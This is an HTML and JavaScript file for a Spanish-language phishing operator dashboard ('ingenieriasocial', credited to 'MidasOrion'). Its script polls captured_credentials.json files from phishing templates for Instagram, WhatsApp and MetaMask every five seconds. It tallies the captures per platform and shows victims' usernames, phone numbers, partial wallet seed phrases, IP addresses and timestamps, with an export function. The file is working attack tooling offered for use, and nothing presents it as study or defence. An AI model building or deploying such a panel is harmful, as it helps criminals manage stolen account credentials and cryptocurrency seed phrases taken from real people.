<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - ingenieriasocial</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .header {
            background: white;
            padding: 30px;
            border-radius: 16px;
            margin-bottom: 30px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            text-align: center;
        }

        .header h1 {
            font-size: 36px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }

        .header p {
            color: #666;
            font-size: 16px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: white;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            text-align: center;
            transition: transform 0.3s;
        }

        .stat-card:hover {
            transform: translateY(-5px);
        }

        .stat-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }

        .stat-value {
            font-size: 42px;
            font-weight: 700;
            color: #667eea;
            margin-bottom: 10px;
        }

        .stat-label {
            font-size: 14px;
            color: #666;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .card {
            background: white;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            margin-bottom: 30px;
        }

        .card-title {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 20px;
            color: #333;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th {
            text-align: left;
            padding: 15px;
            background: #f8f9fa;
            font-weight: 600;
            color: #666;
            text-transform: uppercase;
            font-size: 12px;
            letter-spacing: 1px;
        }

        td {
            padding: 15px;
            border-bottom: 1px solid #f0f0f0;
        }

        tr:hover {
            background: #f8f9fa;
        }

        .platform-badge {
            display: inline-block;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }

        .platform-instagram {
            background: #fce4ec;
            color: #c2185b;
        }

        .platform-whatsapp {
            background: #e8f5e9;
            color: #2e7d32;
        }

        .platform-metamask {
            background: #fff3e0;
            color: #e65100;
        }

        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            margin: 5px;
            transition: all 0.3s;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
        }

        .buttons {
            text-align: center;
            margin: 20px 0;
        }

        .empty-state {
            text-align: center;
            padding: 60px;
            color: #999;
        }

        .empty-icon {
            font-size: 64px;
            margin-bottom: 20px;
        }

        .file-input {
            display: none;
        }

        .file-label {
            display: inline-block;
            padding: 12px 24px;
            background: #667eea;
            color: white;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            margin: 10px;
        }

        .file-label:hover {
            background: #5568d3;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üéØ ingenieriasocial</h1>
            <p>Dashboard de Control - Por MidasOrion</p>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-icon">üéØ</div>
                <div class="stat-value" id="totalCaptures">0</div>
                <div class="stat-label">Total Capturas</div>
            </div>

            <div class="stat-card">
                <div class="stat-icon">üì∑</div>
                <div class="stat-value" id="instagramCount">0</div>
                <div class="stat-label">Instagram</div>
            </div>

            <div class="stat-card">
                <div class="stat-icon">üí¨</div>
                <div class="stat-value" id="whatsappCount">0</div>
                <div class="stat-label">WhatsApp</div>
            </div>

            <div class="stat-card">
                <div class="stat-icon">ü¶ä</div>
                <div class="stat-value" id="metamaskCount">0</div>
                <div class="stat-label">MetaMask</div>
            </div>
        </div>

        <div class="buttons">
            <label for="fileInput" class="file-label">
                üìÇ Cargar archivo JSON
            </label>
            <input type="file" id="fileInput" class="file-input" accept=".json">
            
            <button class="btn btn-primary" onclick="exportData()">
                üìä Exportar Datos
            </button>
            
            <button class="btn btn-primary" onclick="clearData()">
                üóëÔ∏è Limpiar Datos
            </button>
        </div>

        <div class="card">
            <h2 class="card-title">üìã Capturas Recientes</h2>
            <div id="capturesTable"></div>
        </div>
    </div>

    <script>
        let capturesData = [];

        // Cargar datos desde archivos JSON reales
        async function loadData() {
            capturesData = [];
            
            // Rutas de los archivos JSON de capturas
            const platforms = ['instagram', 'whatsapp', 'metamask'];
            
            for (const platform of platforms) {
                try {
                    const response = await fetch(`src/templates/phishing/${platform}/captured_credentials.json`);
                    if (response.ok) {
                        const data = await response.json();
                        if (Array.isArray(data)) {
                            capturesData = capturesData.concat(data);
                        } else if (data) {
                            capturesData.push(data);
                        }
                    }
                } catch (error) {
                    console.log(`No se encontraron capturas para ${platform}`);
                }
            }
            
            // Si no hay datos, mostrar mensaje
            if (capturesData.length === 0) {
                console.log('No hay capturas a√∫n. Los datos aparecer√°n cuando captures credenciales.');
            }
            
            renderData();
        }

        // Renderizar datos
        function renderData() {
            // Actualizar contadores
            document.getElementById('totalCaptures').textContent = capturesData.length;
            
            const instagramCount = capturesData.filter(c => c.platform === 'Instagram').length;
            const whatsappCount = capturesData.filter(c => c.platform === 'WhatsApp').length;
            const metamaskCount = capturesData.filter(c => c.platform === 'MetaMask').length;
            
            document.getElementById('instagramCount').textContent = instagramCount;
            document.getElementById('whatsappCount').textContent = whatsappCount;
            document.getElementById('metamaskCount').textContent = metamaskCount;

            // Renderizar tabla
            const tableDiv = document.getElementById('capturesTable');
            
            if (capturesData.length === 0) {
                tableDiv.innerHTML = `
                    <div class="empty-state">
                        <div class="empty-icon">üì≠</div>
                        <p>No hay capturas a√∫n</p>
                        <p style="margin-top: 10px; font-size: 14px;">Carga un archivo JSON con capturas o espera a que lleguen datos</p>
                    </div>
                `;
                return;
            }

            let html = `
                <table>
                    <thead>
                        <tr>
                            <th>Plataforma</th>
                            <th>Credenciales</th>
                            <th>IP</th>
                            <th>Fecha</th>
                        </tr>
                    </thead>
                    <tbody>
            `;

            capturesData.forEach(capture => {
                const platform = capture.platform || 'Unknown';
                const platformClass = `platform-${platform.toLowerCase()}`;
                const credential = capture.username || capture.phone || 
                                 (capture.seed_phrase ? capture.seed_phrase.substring(0, 30) + '...' : 'N/A');

                html += `
                    <tr>
                        <td><span class="platform-badge ${platformClass}">${platform}</span></td>
                        <td>${credential}</td>
                        <td>${capture.ip || 'N/A'}</td>
                        <td>${capture.timestamp || 'N/A'}</td>
                    </tr>
                `;
            });

            html += `
                    </tbody>
                </table>
            `;

            tableDiv.innerHTML = html;
        }

        // Cargar archivo JSON
        document.getElementById('fileInput').addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (!file) return;

            const reader = new FileReader();
            reader.onload = function(event) {
                try {
                    const data = JSON.parse(event.target.result);
                    if (Array.isArray(data)) {
                        capturesData = data;
                    } else {
                        capturesData = [data];
                    }
                    renderData();
                    alert('‚úÖ Datos cargados exitosamente');
                } catch (error) {
                    alert('‚ùå Error al cargar el archivo JSON');
                    console.error(error);
                }
            };
            reader.readAsText(file);
        });

        // Exportar datos
        function exportData() {
            const dataStr = JSON.stringify(capturesData, null, 2);
            const dataBlob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(dataBlob);
            const link = document.createElement('a');
            link.href = url;
            link.download = `capturas_${new Date().getTime()}.json`;
            link.click();
            URL.revokeObjectURL(url);
        }

        // Limpiar datos
        function clearData() {
            if (confirm('¬øEst√°s seguro de que quieres eliminar todas las capturas del dashboard?')) {
                capturesData = [];
                renderData();
                alert('‚úÖ Vista limpiada (los archivos originales no se modificaron)');
            }
        }

        // Cargar datos al iniciar
        loadData();

        // Auto-refresh cada 5 segundos para cargar nuevas capturas
        setInterval(() => {
            loadData();
        }, 5000);
    </script>
</body>
</html>
